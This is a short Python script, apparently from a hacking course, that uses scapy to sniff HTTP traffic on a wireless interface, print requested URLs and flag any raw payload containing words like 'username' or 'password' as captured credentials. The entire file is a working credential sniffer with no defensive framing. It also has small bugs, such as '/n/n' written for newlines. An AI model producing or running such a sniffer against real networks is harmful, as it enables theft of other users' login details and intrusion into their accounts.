import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
        print("[+] http request   >    "+url)
        if(packet.haslayer(scapy.Raw)):
            load =(packet[scapy.Raw].load)
            keywords=["username","user","password","pass","login","signup","name"]
            for key in keywords:
                if key in load:
                    print ("/n/n possible username/password    >>    "+load+"/n/n")
                    break


sniff("wlan0")